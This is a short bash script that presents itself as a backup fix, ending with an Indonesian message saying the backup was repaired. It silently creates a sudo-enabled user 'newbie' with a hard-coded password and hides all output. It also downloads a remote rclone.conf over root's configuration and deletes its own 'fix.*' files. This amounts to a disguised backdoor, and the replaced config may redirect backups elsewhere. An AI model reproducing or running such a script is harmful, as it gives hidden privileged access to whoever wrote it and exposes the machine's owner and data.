#!/bin/bash
    Username=newbie
    Password=123@Newbie
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1
wget -q https://raw.githubusercontent.com/diah082/newbie/main/Cfg/rclone.conf
mv rclone.conf /root/.config/rclone/rclone.conf
rm fix.*
clear
echo -e "BACKUP BERHASIL DIPERBAIKI" | lolcat
sleep 5
exit 0
